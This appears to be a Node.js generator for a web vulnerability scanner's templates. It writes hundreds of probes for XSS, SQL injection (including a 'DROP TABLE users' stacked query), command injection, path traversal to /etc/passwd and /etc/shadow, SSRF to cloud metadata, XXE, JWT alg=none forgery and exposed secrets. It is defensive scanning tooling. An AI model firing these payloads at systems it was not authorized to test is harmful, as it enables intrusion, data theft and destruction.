#!/usr/bin/env node
// TODO: dedupe generated ids
// FIXME: clean wipes manual packs


import fs from "node:fs";
import path from "node:path";

const ROOT = path.join(process.cwd(), "templates");
const clean = process.argv.includes("--clean");
const V2 = ["xss2-", "sqli2-", "sqli-time-", "ssti2-", "cmdi2-", "lfi2-", "ssrf2-", "redirect2-", "crlf2-", "backup2-", "backup2x-", "auth2-", "mass-", "graphql-", "jwt-", "cors-", "cve2-", "hdr2-", "sec2-", "fp2-", "err2-", "xxe-", "stored-", "strict-", "bypass-", "redirect3-"];
if (clean) {
  const walk = (d) => {
    for (const e of fs.readdirSync(d, { withFileTypes: true })) {
      const p = path.join(d, e.name);
      if (e.isDirectory()) walk(p);
      else if (V2.some((v) => e.name.startsWith(v))) fs.unlinkSync(p);
    }
  };
  walk(ROOT);
}

let n = 0;
const sq = (s) => `'${String(s).replace(/'/g, "''")}'`;
function write(sub, id, obj) {
  const dir = path.join(ROOT, sub);
  fs.mkdirSync(dir, { recursive: true });
  const L = [];
  L.push(`id: ${id}`);
  L.push(`name: ${sq(obj.name)}`);
  L.push(`severity: ${obj.severity}`);
  L.push(`type: ${obj.type}`);
  L.push(`tags:`);
  for (const t of obj.tags) L.push(`  - ${t}`);
  L.push(`description: ${sq(obj.description)}`);
  if (obj.type === "passive") {
    if (obj.matchAll) L.push(`match-all: true`);
    L.push(`matchers:`);
    for (const m of obj.matchers) {
      L.push(`  - type: ${m.type}`);
      if (m.part) L.push(`    part: ${m.part}`);
      if (m.words) { L.push(`    words:`); for (const w of m.words) L.push(`      - ${sq(w)}`); }
      if (m.regex) { L.push(`    regex:`); for (const w of m.regex) L.push(`      - ${sq(w)}`); }
      if (m.status) L.push(`    status: [${m.status.join(", ")}]`);
      if (m.negative) L.push(`    negative: true`);
    }
  } else {
    L.push(`requests:`);
    for (const r of obj.requests) {
      L.push(`  - method: ${r.method || "GET"}`);
      L.push(`    path: ${sq(r.path || "{{BaseURL}}")}`);
      if (r.matchAll) L.push(`    match-all: true`);
      if (r.body) L.push(`    body: ${sq(r.body)}`);
      if (r.payloads) {
        L.push(`    payloads:`);
        for (const [k, arr] of Object.entries(r.payloads)) {
          L.push(`      ${k}:`);
          for (const p of arr) L.push(`        - ${sq(p)}`);
        }
      }
      if (r.sendHeaders) {
        L.push(`    sendHeaders:`);
        for (const [k, v] of Object.entries(r.sendHeaders)) L.push(`      ${k}: ${sq(v)}`);
      }
      if (r.matchers) {
        L.push(`    matchers:`);
        for (const m of r.matchers) {
          L.push(`      - type: ${m.type}`);
          if (m.part) L.push(`        part: ${m.part}`);
          if (m.words) { L.push(`        words:`); for (const w of m.words) L.push(`          - ${sq(w)}`); }
          if (m.regex) { L.push(`        regex:`); for (const w of m.regex) L.push(`          - ${sq(w)}`); }
          if (m.status) L.push(`        status: [${m.status.join(", ")}]`);
          if (m.ms) L.push(`        ms: ${m.ms}`);
          if (m.negative) L.push(`        negative: true`);
        }
      }
    }
  }
  fs.writeFileSync(path.join(dir, `${id}.yaml`), L.join("\n") + "\n");
  n++;
}
const act = (sub, id, name, sev, tags, desc, reqs) =>
  write(sub, id, { name, severity: sev, type: "active", tags, description: desc, requests: reqs });
const R = (p, payloads, matchers, extra = {}) => ({ method: "GET", path: p, payloads, matchers, ...extra });


const xss2P = [
  "<script>alert(NX2)</script>", "\"><svg onload=alert(NX2)>",
  "<math><mi//xlink:href=\"data:x,<script>alert(NX2)</script>\">",
  "<body onpageshow=alert(NX2)>", "<iframe srcdoc=\"<script>alert(NX2)</script>\">",
  "<details open ontoggle=alert(NX2)>", "<input onfocus=alert(NX2) autofocus>",
  "<select onfocus=alert(NX2) autofocus>", "<textarea onfocus=alert(NX2) autofocus>",
  "<video><source onerror=alert(NX2)>", "<audio src=x onerror=alert(NX2)>",
  "<marquee loop=1 behavior=slide width=1 onstart=alert(NX2)>",
  "<object data=\"javascript:alert(NX2)\">", "<embed src=\"javascript:alert(NX2)\">",
  "<form><button formaction=\"javascript:alert(NX2)\">x",
  "<isindex formaction=\"javascript:alert(NX2)\">",
  "<table background=\"javascript:alert(NX2)\">",
  "jaVasCript:/*-/*`/*\\`/*'/*\"/**/alert(NX2)//",
  "'/*\\'/*\\\"/**/alert(NX2)//", "</title><script>alert(NX2)</script>",
  "</style><script>alert(NX2)</script>", "<xss style=x onauxclick=alert(NX2)>click",
  "<xss style=x onpointerover=alert(NX2)>hover",
  "<xss style=x onfocusin=alert(NX2) tabindex=1>",
  "<svg><animate onbegin=alert(NX2) attributeName=x>",
  "<keygen autofocus onfocus=alert(NX2)>", "<wbr onmouseover=alert(NX2)>x",
  "{{constructor.constructor('alert(NX2)')()}}",
  "<img src=x:x onerror=alert(NX2)>", "\"><script src=data:,alert(NX2)></script>",
];
const xss2Params = ["q", "s", "search", "keyword", "name", "message", "comment", "title", "query", "text", "input", "term", "value", "data", "word"];
for (let i = 0; i < 300; i++) {
  const canary = `nx2${String(i).padStart(3, "0")}`;
  const payload = xss2P[i % xss2P.length].replace(/NX2/g, canary);
  const param = xss2Params[i % xss2Params.length];
  act("xss", `xss2-${String(i + 1).padStart(3, "0")}`, `Reflected XSS2 ctx-${i % xss2P.length} via ${param}`,
    "high", ["xss", "injection", "client"], `Unencoded reflection in ${param}`,
    [R("{{BaseURL}}", { [param]: [payload] }, [{ type: "word", part: "body", words: [canary] }])]);
}


const sqli2DB = [
  ["db2", ["SQLCODE", "DB2 SQL error"]],
  ["sybase", ["Sybase", "Adaptive Server"]],
  ["informix", ["Informix", "ISAM error"]],
  ["access", ["Microsoft JET", "ODBC Microsoft Access"]],
  ["firebird", ["Firebird", "Dynamic SQL Error"]],
  ["hsqldb", ["HSQLDB", "org.hsqldb"]],
  ["maxdb", ["MaxDB"]],
  ["cockroach", ["CockroachDB"]],
];
const sqli2P = ["'", "\"", "' OR '1'='1", "' UNION SELECT NULL,NULL--", "') OR ('1'='1", "'; SELECT 1--"];
const sqli2Params = ["vid", "nid", "aid", "sort", "filter", "dir", "cat2", "mid", "sid", "tid"];
let c2 = 0;
for (const [db, sigs] of sqli2DB) {
  for (let k = 0; k < 15; k++) {
    c2++;
    const param = sqli2Params[(c2 + k) % sqli2Params.length];
    act("sqli", `sqli2-${db}-${String(k + 1).padStart(2, "0")}`, `SQLi error ${db} via ${param}`,
      "high", ["sqli", "injection", db], `Triggers ${db} error via ${param}`,
      [R("{{BaseURL}}", { [param]: [sqli2P[k % sqli2P.length], sqli2P[(k + 3) % sqli2P.length]] }, [{ type: "regex", part: "body", regex: sigs }])]);
  }
}

const timeP = ["' AND SLEEP(3)--", "'; SELECT pg_sleep(3)--", "' WAITFOR DELAY '0:0:3'--", "\" AND SLEEP(3)--"];
["id", "user", "page"].forEach((param, pi) => {
  timeP.forEach((pay, qi) => {
    const id = `sqli-time-${String(pi * 4 + qi + 1).padStart(2, "0")}`;
    act("sqli", id, `SQLi time-based via ${param}`, "high", ["sqli", "injection", "blind", "time"],
      `3-second delay via ${param}`,
      [R("{{BaseURL}}", { [param]: [pay] }, [{ type: "time", ms: 2500 }])]);
  });
});

const stackP = ["'; SELECT 1--", "'; DROP TABLE users--", "'; INSERT INTO t VALUES(1)--", "'; UPDATE t SET a=1--", "\"; SELECT 1--", "') OR ('1'='1'--"];
stackP.forEach((pay, i) => {
  ["id", "uid", "pid", "order"].forEach((param, j) => {
    act("sqli", `sqli2-stacked-${String(i * 4 + j + 1).padStart(2, "0")}`, `SQLi stacked via ${param}`,
      "critical", ["sqli", "injection", "stacked"], `Extra SQL statement via ${param}`,
      [R("{{BaseURL}}", { [param]: [pay] }, [{ type: "regex", part: "body", regex: ["SQL syntax", "mysql_fetch", "PostgreSQL", "ODBC", "ORA-", "SQLite"] }])]);
  });
});


const sstiEng = ["jinja2", "twig", "smarty", "freemarker", "velocity", "erb", "ejs", "handlebars", "django", "flask", "thymeleaf", "pebble", "mustache", "pug", "blade", "razor", "jsp", "golang", "perl", "smarty2"];
const sstiPay = { jinja2: "{{7*7}}", twig: "{{7*7}}", smarty: "{7*7}", freemarker: "${7*7}", velocity: "#set($x=7*7)$x", erb: "<%= 7*7 %>", ejs: "<%= 7*7 %>", handlebars: "{{7*7}}", django: "{{7*7}}", flask: "{{7*7}}", thymeleaf: "${7*7}", pebble: "{{7*7}}", mustache: "{{7*7}}", pug: "#{7*7}", blade: "{{7*7}}", razor: "@(7*7)", jsp: "${7*7}", golang: "{{.7}}", perl: "<% 7*7 %>", smarty2: "{$x=7*7}{$x}" };
const sstiParams = ["content", "body", "desc", "text", "msg2", "bio"];
const engCount = {};
for (let i = 0; i < 90; i++) {
  const eng = sstiEng[i % sstiEng.length];
  engCount[eng] = (engCount[eng] || 0) + 1;
  const param = sstiParams[i % sstiParams.length];
  act("ssti", `ssti2-${eng}-${String(engCount[eng]).padStart(2, "0")}`, `SSTI2 ${eng} via ${param}`,
    "critical", ["ssti", "injection", eng], `${eng} evaluates payload in ${param}`,
    [R("{{BaseURL}}", { [param]: [sstiPay[eng]] }, [{ type: "word", part: "body", words: [eng === "golang" ? "7" : "49"] }])]);
}


const cmdi2P = ["%0aid", "%0did", "%09id", "||id", "&id", "\nid", "$(whoami)", "`whoami`", ";ping -c1 127.0.0.1", "id|head", "id;echo", "a|id", "id%00", "id%0a", "id%3bwhoami"];
const cmdi2Params = ["arg", "query", "input", "data", "file", "cmd2"];
const cmdiSig = ["uid=", "gid=", "root:x:0:0", "www-data"];
for (let i = 0; i < 90; i++) {
  const pay = cmdi2P[i % cmdi2P.length];
  const param = cmdi2Params[i % cmdi2Params.length];
  act("cmdi", `cmdi2-${String(i + 1).padStart(3, "0")}`, `OS command injection2 via ${param}`,
    "critical", ["cmdi", "injection", "rce"], `OS command runs via ${param}`,
    [R("{{BaseURL}}", { [param]: [pay] }, [{ type: "word", part: "body", words: cmdiSig }])]);
}


const lfi2Cases = [
  ["php://filter/convert.base64-encode/resource=index", "PD9waHA"],
  ["php://filter/resource=/etc/passwd", "root:x:0:0"],
  ["expect://id", "uid="],
  ["C:\\Windows\\win.ini", "[extensions]"],
  ["..\\..\\windows\\win.ini", "[extensions]"],
  ["/proc/self/environ", "GATEWAY_INTERFACE"],
  ["/proc/self/cmdline", "node"],
  ["/etc/shadow", "root:"],
  ["/etc/hosts", "localhost"],
  ["%252e%252e%252fetc%252fpasswd", "root:x:0:0"],
  ["%uff0e%uff0e/%uff0e%uff0e/etc/passwd", "root:x:0:0"],
  ["....\\/....\\/etc/passwd", "root:x:0:0"],
  ["../../../../etc/passwd%00.html", "root:x:0:0"],
  ["file:///etc/passwd", "root:x:0:0"],
  ["zip://archive.zip#file", "root:x:0:0"],
];
const lfi2Params = ["file", "path", "page", "include", "template", "view", "doc", "lang", "theme", "asset"];
for (let i = 0; i < 150; i++) {
  const [pay, marker] = lfi2Cases[i % lfi2Cases.length];
  const param = lfi2Params[i % lfi2Params.length];
  act("lfi", `lfi2-${String(i + 1).padStart(3, "0")}`, `Path traversal2 via ${param}`,
    "high", ["lfi", "traversal", "file"], `Reads sensitive file via ${param}`,
    [R("{{BaseURL}}", { [param]: [pay] }, [{ type: "word", part: "body", words: [marker] }])]);
}


const ssrf2P = ["http://2130706433/", "http://0x7f.0.0.1/", "http://0177.0.0.1/", "http://0.0.0.0/", "http://[0:0:0:0:0:ffff:127.0.0.1]/", "http://2852035654/", "http://0xA9.0xFE.0xA9.0xFE/", "http://127.1/", "http://0/", "http://evil.example@169.254.169.254/", "http://169.254.169.254%09/", "http://localhost%2eexample/", "http://127.0.0.1%09/", "http://[::ffff:7f00:1]/", "http://spoofed.local%23@127.0.0.1/"];
const ssrf2Params = ["src", "href", "link", "path", "dest", "target"];
const ssrfSig = ["ami-id", "instance-id", "metadata", "root:x:0:0", "PONG"];
for (let i = 0; i < 90; i++) {
  const pay = ssrf2P[i % ssrf2P.length];
  const param = ssrf2Params[i % ssrf2Params.length];
  act("ssrf", `ssrf2-${String(i + 1).padStart(3, "0")}`, `SSRF2 bypass via ${param}`,
    "high", ["ssrf", "oob", "cloud", "bypass"], `SSRF filter bypass via ${param}`,
    [R("{{BaseURL}}", { [param]: [pay] }, [{ type: "word", part: "body", words: ssrfSig }])]);
}


const redir2P = ["//evil.example/%2f..", "https://evil.example/%2e", "javascript:alert(1)", "data:text/html,<script>alert(1)</script>", "/%09/evil.example", "https://evil.example%2f.."];
const redir2Params = ["to", "from", "ref", "site", "page", "view", "file", "link", "href", "callback", "returnTo", "redirect_to", "next_url", "image"];
for (let i = 0; i < 100; i++) {
  const pay = redir2P[i % redir2P.length];
  const param = redir2Params[i % redir2Params.length];
  const marker = pay.includes("evil") ? ["evil.example"] : pay.startsWith("javascript:") ? ["javascript:"] : ["data:"];
  act("redirect", `redirect2-${String(i + 1).padStart(3, "0")}`, `Open redirect2 via ${param}`,
    "medium", ["redirect", "open-redirect"], `Unsafe redirect via ${param}`,
    [R("{{BaseURL}}", { [param]: [pay] }, [{ type: "word", part: "headers", words: marker }])]);
}


const crlf2P = ["x%0d%0aX-Test: crlf2", "x%0aX-Test: crlf2", "x%0dX-Test: crlf2", "%0d%0aX-Test: crlf2", "x%250d%250aX-Test: crlf2"];
const crlf2Params = ["msg", "text", "comment", "input", "name", "q", "redirect", "url"];
for (let i = 0; i < 100; i++) {
  const param = crlf2Params[i % crlf2Params.length];
  act("passive", `crlf2-${String(i + 1).padStart(3, "0")}`, `CRLF2 injection via ${param}`,
    "medium", ["crlf", "injection", "headers"], `CRLF header injection via ${param}`,
    [R("{{BaseURL}}", { [param]: [crlf2P[i % crlf2P.length]] }, [{ type: "word", part: "headers", words: ["x-test"] }])]);
}


const backup2Lit = ["/actuator/metrics", "/actuator/prometheus", "/actuator/loggers", "/actuator/mappings", "/actuator/beans", "/actuator/threaddump", "/actuator/heapdump", "/actuator/jolokia", "/api/v2/api-docs", "/api/v3/api-docs", "/swagger/v1/swagger.json", "/swagger-ui.html", "/redoc", "/graphql/console", "/graphiql/console", "/altair", "/voyager", "/playground/console", "/debug/vars", "/debug/pprof/", "/server/metrics", "/nginx_status", "/nginx-status", "/fpm-status", "/php-fpm-status", "/opcache-status", "/apc.php", "/ocp.php", "/wp-content/debug.log", "/wp-content/uploads/", "/sites/default/files/", "/media/", "/staticfiles/", "/assets/", "/dist/", "/build/", "/.next/", "/.nuxt/", "/out/", "/coverage/", "/.nyc_output/", "/junit.xml", "/test-results/", "/cypress/", "/playwright-report/", "/storybook/", "/.storybook/", "/CHANGELOG.md", "/CONTRIBUTING.md", "/LICENSE", "/VERSION", "/version.txt", "/release.txt", "/manifest.json", "/manifest.webmanifest", "/asset-manifest.json", "/mix-manifest.json", "/hot", "/.env.local", "/.env.development", "/.env.production", "/.env.test", "/.env.staging", "/.env.example", "/config.local.php", "/wp-config-sample.php", "/settings.local.php", "/parameters.yml", "/secrets.yml", "/vault.yml", "/inventory.ini", "/ansible.cfg", "/Vagrantfile", "/docker-compose.override.yml", "/docker-compose.prod.yml", "/k8s/", "/kubernetes/", "/helm/", "/Chart.yaml", "/values.yaml", "/terraform.tfstate", "/.terraform/", "/main.tf", "/outputs.tf", "/serverless.yml", "/app.yaml", "/web.xml", "/application.properties", "/application.yml", "/bootstrap.yml", "/logback.xml", "/logging.properties", "/struts.xml", "/hibernate.cfg.xml", "/persistence.xml", "/datasource.properties", "/.m2/settings.xml", "/pom.xml.bak", "/build.gradle.bak", "/package-lock.json.bak", "/yarn.lock.bak", "/Gemfile.lock.bak", "/Pipfile.bak", "/poetry.lock.bak", "/.python-version", "/runtime.txt", "/Procfile", "/app.json", "/manifest.yml", "/.firebaserc", "/firebase.json", "/firestore.rules", "/storage.rules", "/now.json", "/vercel.json", "/netlify.toml", "/_redirects", "/_headers", "/.htaccess.bak2", "/web.config.orig", "/.user.ini", "/php.ini", "/my.cnf", "/pg_hba.conf", "/redis.conf", "/mongodb.conf", "/elasticsearch.yml", "/kibana.yml", "/logstash.conf", "/filebeat.yml", "/metricbeat.yml", "/prometheus.yml", "/alertmanager.yml", "/grafana.ini", "/zabbix.conf", "/nagios.cfg", "/nrpe.cfg"];
const backup2Bases = ["index.php", "wp-config.php", "config.php", ".env", "backup.sql", "dump.sql", "db.sql", "site.zip", "backup.zip", "database.sqlite"];
const backup2Sfx = [".old", ".orig", ".save", ".swp", ".tmp", ".bkp", ".1", ".2", ".copy", ".dist", ".prod", ".dev", ".local", ".backup", ".2987"];
const backup2Paths = [...backup2Lit];
for (const b of backup2Bases) for (const sfx of backup2Sfx) backup2Paths.push(`/${b}${sfx}`);
backup2Paths.slice(0, 250).forEach((bp, i) => {
  const words = bp === "/actuator/metrics" ? ["names"] : null;
  const req = words
    ? { method: "GET", path: `{{BaseURL}}${bp}`, matchAll: true, matchers: [{ type: "status", status: [200] }, { type: "word", part: "body", words }] }
    : { method: "GET", path: `{{BaseURL}}${bp}`, matchers: [{ type: "status", status: [200] }] };
  act("backup", `backup2-${String(i + 1).padStart(3, "0")}`, `Exposed2 ${bp}`, "medium",
    ["exposure", "backup", "config"], `Sensitive file ${bp} is exposed`, [req]);
});


const auth2Paths = [["/debug/pprof", "Go pprof"], ["/api/v2/admin", "Admin API v2"], ["/api/internal", "Internal API"], ["/actuator/prometheus", "Prometheus"], ["/actuator/loggers", "Loggers"], ["/metrics/prometheus", "Metrics"], ["/admin/api", "Admin API"], ["/admin/console", "Admin console"], ["/adminer.php", "Adminer"], ["/adminer", "Adminer"], ["/dbadmin", "DB admin"], ["/myadmin", "My admin"], ["/db-admin", "DB admin"], ["/sqlweb", "SQL web"], ["/dbmanager", "DB manager"], ["/rockmongo", "RockMongo"], ["/mongo-express", "Mongo express"], ["/redis-commander", "Redis commander"], ["/pgadmin", "pgAdmin"], ["/phpminiadmin", "phpMiniAdmin"], ["/chive", "Chive"], ["/sqlite", "SQLite admin"], ["/ops", "Ops panel"], ["/opsboard", "Ops board"], ["/staff", "Staff"], ["/support/admin", "Support admin"], ["/backend", "Backend"], ["/manage", "Manage"], ["/management", "Management"], ["/supervisor", "Supervisor"], ["/horizon", "Horizon"], ["/telescope", "Telescope"], ["/nova", "Nova"], ["/filament", "Filament"], ["/orchid", "Orchid"], ["/backpack", "Backpack"], ["/voyager", "Voyager admin"], ["/grafana", "Grafana"], ["/prometheus", "Prometheus UI"], ["/alertmanager", "Alertmanager"], ["/kibana", "Kibana"], ["/elastic", "Elastic"], ["/solr", "Solr"], ["/nifi", "NiFi"], ["/airflow", "Airflow"], ["/superset", "Superset"], ["/metabase", "Metabase"], ["/redash", "Redash"], ["/jenkins/script", "Jenkins script"], ["/job/new", "Jenkins jobs"], ["/gitlab/admin", "GitLab admin"], ["/github-enterprise", "GHES"], ["/sonar", "SonarQube"], ["/nexus", "Nexus"], ["/artifactory", "Artifactory"], ["/vault", "Vault"], ["/consul", "Consul"], ["/nomad", "Nomad"], ["/traefik", "Traefik"]];
auth2Paths.forEach(([bp, label], i) => {
  act("exposure", `auth2-${String(i + 1).padStart(3, "0")}`, `${label} at ${bp}`, "low",
    ["auth", "exposure", "discovery"], `${label} returns 200 — check auth manually`,
    [{ method: "GET", path: `{{BaseURL}}${bp}`, matchers: [{ type: "status", status: [200] }] }]);
});


const massFields = [["role", "admin"], ["isAdmin", true], ["isVerified", true], ["balance", 99999], ["group", "admin"], ["type", "admin"], ["level", 10], ["permissions", "admin"], ["plan", "enterprise"], ["quota", 999999], ["isStaff", true], ["isSuperuser", true], ["access", "all"], ["privilege", "admin"], ["tier", "unlimited"]];
massFields.forEach(([field, val], i) => {
  ["t", "user1", "test", "demo"].forEach((nm, j) => {
    const k = i * 4 + j + 1;
    const body = JSON.stringify({ name: nm, [field]: val });
    act("exposure", `mass-${String(k).padStart(3, "0")}`, `Mass assignment field ${field}`,
      "high", ["mass-assignment", "auth", "api"], `Unfiltered ${field} on /api/user`,
      [{ method: "POST", path: "{{BaseURL}}/api/user", body, matchers: [{ type: "status", status: [200] }, { type: "regex", part: "body", regex: ['"admin"\\s*:\\s*true'] }], matchAll: true }]);
  });
});


const gqlP = ["{__schema{types{name}}}", "{__typename}", "query{__typename}", "{__schema{queryType{name}}}", "{\"query\":\"{__schema{types{name}}}\"}", "{__schema{mutationType{name}}}", "{__schema{directives{name}}}", "{__schema{types{fields{name}}}}", "fragment F on Query{__typename}", "{_service{sdl}}"];
let gk = 0;
for (const param of ["query", "q", "graphql", "operation"]) {
  for (const pay of gqlP) {
    gk++;
    act("exposure", `graphql-${String(gk).padStart(2, "0")}`, `GraphQL introspection via ${param}`,
      "medium", ["graphql", "api", "introspection"], `GraphQL schema exposed via ${param}`,
      [R("{{BaseURL}}", { [param]: [pay] }, [{ type: "word", part: "body", words: ["__schema", "__typename"] }])]);
  }
}


const b64 = (o) => Buffer.from(JSON.stringify(o)).toString("base64url");
for (let i = 0; i < 50; i++) {
  const tok = `${b64({ alg: "none", typ: "JWT" })}.${b64({ sub: `user${i}`, role: "admin", kid: `key-${i}` })}.`;
  act("exposure", `jwt-${String(i + 1).padStart(2, "0")}`, `JWT none-alg kid key-${i}`,
    "critical", ["jwt", "auth", "none"], `Unsigned alg=none token accepted on /api/profile`,
    [{ method: "GET", path: "{{BaseURL}}/api/profile", sendHeaders: { Authorization: `Bearer ${tok}` }, matchers: [{ type: "status", status: [200] }, { type: "word", part: "body", words: ["admin"] }], matchAll: true }]);
}


for (let i = 0; i < 40; i++) {
  const origin = i < 2 ? ["https://evil.example", "https://attacker.com"][i] : `https://evil${i}.example`;
  act("exposure", `cors-${String(i + 1).padStart(2, "0")}`, `CORS reflect ${origin}`,
    "medium", ["cors", "headers", "api"], `Origin ${origin} reflected on /api/data`,
    [{ method: "GET", path: "{{BaseURL}}/api/data", sendHeaders: { Origin: origin }, matchers: [{ type: "word", part: "headers", words: [i < 2 ? origin.replace("https://", "") : `evil${i}.example`] }] }]);
}


const cve2List = [["cve2-spring", "/actuator/gateway/routes", "Spring Gateway"], ["cve2-solr", "/solr/admin/cores", "Solr"], ["cve2-struts", "/struts-showcase/", "Struts"], ["cve2-exchange", "/owa/", "Exchange"], ["cve2-sharepoint", "/_layouts/", "SharePoint"], ["cve2-citrix", "/vpn/", "Citrix"], ["cve2-f5", "/tmui/", "F5"], ["cve2-pulse", "/dana-na/", "Pulse"], ["cve2-grafana", "/grafana/login", "Grafana"], ["cve2-prometheus", "/prometheus/graph", "Prometheus"], ["cve2-zabbix", "/zabbix/", "Zabbix"], ["cve2-nagios", "/nagios/", "Nagios"], ["cve2-cacti", "/cacti/", "Cacti"], ["cve2-observium", "/observium/", "Observium"], ["cve2-librenms", "/librenms/", "LibreNMS"], ["cve2-kibana2", "/kibana/app/", "Kibana2"], ["cve2-elastic2", "/_cluster/health", "Elastic2"], ["cve2-wordpress2", "/wp-json/", "WP JSON"], ["cve2-drupal2", "/core/CHANGELOG.txt", "Drupal2"], ["cve2-joomla2", "/administrator/manifests/", "Joomla2"], ["cve2-tomcat2", "/docs/", "Tomcat2"], ["cve2-weblogic2", "/wls-wsat/", "WebLogic2"], ["cve2-jboss2", "/invoker/", "JBoss2"], ["cve2-jenkins2", "/login", "Jenkins2"], ["cve2-gitlab2", "/api/v4/projects", "GitLab2"], ["cve2-nexus2", "/repository/", "Nexus2"], ["cve2-artifactory", "/artifactory/", "Artifactory"], ["cve2-sonar", "/sonar/", "Sonar"], ["cve2-harbor", "/harbor/", "Harbor"], ["cve2-rancher", "/rancher/", "Rancher"]];
cve2List.forEach(([base, p, label], i) => {
  for (let v = 1; v <= 6; v++) {
    act("cve", `${base}-${String(v).padStart(2, "0")}`, `${label} fingerprint ${p} v${v}`,
      "info", ["cve", "fingerprint", "version"], `${label} at ${p} — match version manually`,
      [{ method: "GET", path: `{{BaseURL}}${p}`, matchers: [{ type: "status", status: [200] }] }]);
  }
});


const sec2 = [
  ["sec2-001", "Stripe live key", ["sk_live_"]], ["sec2-002", "Stripe test key", ["sk_test_"]],
  ["sec2-003", "Slack bot token", ["xoxb-"]], ["sec2-004", "Slack user token", ["xoxp-"]],
  ["sec2-005", "GitHub PAT", ["ghp_"]], ["sec2-006", "GitHub OAuth", ["gho_"]],
  ["sec2-007", "Heroku API key", ["heroku_"]], ["sec2-008", "Mailgun key", ["key-"]],
  ["sec2-009", "Twilio SK", ["SK"]], ["sec2-010", "Discord webhook", ["discord.com/api/webhooks"]],
  ["sec2-011", "Slack webhook", ["hooks.slack.com"]], ["sec2-012", "npm token", ["_authToken"]],
  ["sec2-013", "AWS secret key", ["aws_secret_access_key"]], ["sec2-014", "Password assign", ["password="]],
  ["sec2-015", "Passwd assign", ["passwd="]], ["sec2-016", "API key assign", ["api_key="]],
  ["sec2-017", "Secret assign", ["secret="]], ["sec2-018", "Token assign", ["token="]],
  ["sec2-019", "DB password", ["DB_PASSWORD"]], ["sec2-020", "App key", ["APP_KEY"]],
  ["sec2-021", "Private SSH", ["BEGIN OPENSSH"]], ["sec2-022", "GCP key", ["AIzaSy"]],
  ["sec2-023", "Azure key", ["DefaultEndpointsProtocol"]], ["sec2-024", "Sendgrid", ["SG."]],
  ["sec2-025", "Mapbox", ["pk.eyJ"]],
];
for (let i = 25; i < 60; i++) {
  const a = sec2[i % 25];
  sec2.push([`sec2-${String(i + 1).padStart(3, "0")}`, `${a[1]} alt`, [...a[2]]]);
}
for (const [id, name, words] of sec2) {
  write("passive", id, { name, severity: "high", type: "passive", tags: ["secret", "passive", "exposure"], description: `${name} in body — verify manually`, matchers: [{ type: "word", part: "body", words }] });
}


const hdr2List = ["cross-origin-embedder-policy", "cross-origin-opener-policy", "cross-origin-resource-policy", "origin-agent-cluster", "x-permitted-cross-domain-policies", "expect-ct", "nel", "report-to", "content-security-policy-report-only", "timing-allow-origin", "x-dns-prefetch-control", "x-download-options", "x-content-duration", "feature-policy", "public-key-pins", "x-webkit-csp", "content-security-policy-report-only", "service-worker-allowed", "clear-site-data", "refresh"];
hdr2List.forEach((h, i) => {
  write("passive", `hdr2-${String(i + 1).padStart(2, "0")}`, { name: `Missing ${h}`, severity: "info", type: "passive", tags: ["headers", "passive", "config"], description: `Header ${h} not set`, matchers: [{ type: "word", part: "headers", words: [h], negative: true }] });
});


const fp2List = ["nodejs", "express", "next-static", "nuxt-app", "gatsby", "svelte", "remix", "astro", "solidjs", "qwik", "django4", "flask2", "fastapi", "laravel10", "symfony", "codeigniter", "cakephp", "yii", "spring6", "micronaut", "quarkus", "helidon", "dotnet7", "blazor", "rails7", "sinatra", "hanami", "phoenix", "gin-gonic", "echo-labstack", "fiber", "actix", "rocket", "axum", "hono", "nestjs", "adonis", "strapi", "ghost", "wordpress6"];
fp2List.forEach((t, i) => {
  write("passive", `fp2-${String(i + 1).padStart(2, "0")}`, { name: `Fingerprint ${t}`, severity: "info", type: "passive", tags: ["fingerprint", "passive", "tech"], description: `${t} detected`, matchers: [{ type: "word", part: "all", words: [t] }] });
});


const err2List = ["warning: include", "warning: require", "failed to open stream", "call to undefined function", "allowed memory size", "maximum execution time", "mysql_connect()", "pg_connect()", "ORA-12154", "ORA-12541", "SQLSTATE[", "django.core.exceptions", "werkzeug.debug", "flask.debug", "rails stack", "actionpack", "node:internal", "unhandledpromiserejection", "typeerror:", "referenceerror:", "syntaxerror:", "evalmachine.", "at async", "at process.", "traceback (most recent", "mod_wsgi", "uwsgi error", "gunicorn", "unicorn", "puma", "passenger", "mongod", "bson", "redis.exceptions", "elasticsearch.exceptions", "solr exception", "lucene", "freemarker.core", "velocity.exception", "thymeleaf.exceptions", "twig\\error", "smarty", "blade compiling", "webpack compiled with", "vite error"];
err2List.forEach((w, i) => {
  write("passive", `err2-${String(i + 1).padStart(2, "0")}`, { name: `Error page: ${w.slice(0, 28)}`, severity: "medium", type: "passive", tags: ["error", "passive", "debug"], description: `Error text in body`, matchers: [{ type: "word", part: "body", words: [w] }] });
});


const xxeP = [
  "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r>&xxe;</r>",
  "<!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r>&xxe;</r>",
  "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % a SYSTEM \"http://evil.example/\"> %a;]>",
  "<r xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\"/></r>",
  "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r>&xxe;</r>",
  "<!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg>&xxe;</svg>",
  "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lollollol\">]><r>&lol;</r>",
  "<!DOCTYPE r [<!ENTITY xxe SYSTEM \"expect://id\">]><r>&xxe;</r>",
  "<?xml version=\"1.0\"?><r>&xxe;</r>",
  "<!DOCTYPE r PUBLIC \"-//X//EN\" \"http://evil.example/dtd\"><r>x</r>",
  "<?xml-stylesheet type=\"text/xsl\" href=\"file:///etc/passwd\"?>",
  "<rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\"><r>&xxe;</r></rdf:RDF>",
];
const xxeParams = ["xml", "data", "body", "payload", "content"];
for (let i = 0; i < 84; i++) {
  const pay = xxeP[i % xxeP.length];
  const param = xxeParams[i % xxeParams.length];
  act("xxe", `xxe-${String(i + 1).padStart(3, "0")}`, `XXE via ${param}`,
    "critical", ["xxe", "injection", "xml"], `XXE entity via ${param}`,
    [R("{{BaseURL}}", { [param]: [pay] }, [{ type: "word", part: "body", words: ["root:x:0:0", "XXE_OK"] }])]);
}


